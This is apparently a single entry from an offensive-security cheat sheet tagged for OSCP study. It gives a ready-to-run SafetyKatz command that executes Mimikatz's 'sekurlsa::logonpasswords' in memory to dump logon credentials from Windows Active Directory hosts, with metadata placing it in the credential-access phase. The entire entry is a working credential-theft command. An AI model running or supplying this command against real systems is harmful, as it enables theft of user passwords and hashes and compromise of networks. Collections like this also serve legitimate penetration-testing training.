---
command: |
  SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
description: Run Mimikatz commands in-memory via .NET reflection to dump credentials.
os: [Windows]
category: [oscp]
service: [AD]
phase: [CredAccess]
references:
  - https://github.com/GhostPack/SafetyKatz
---
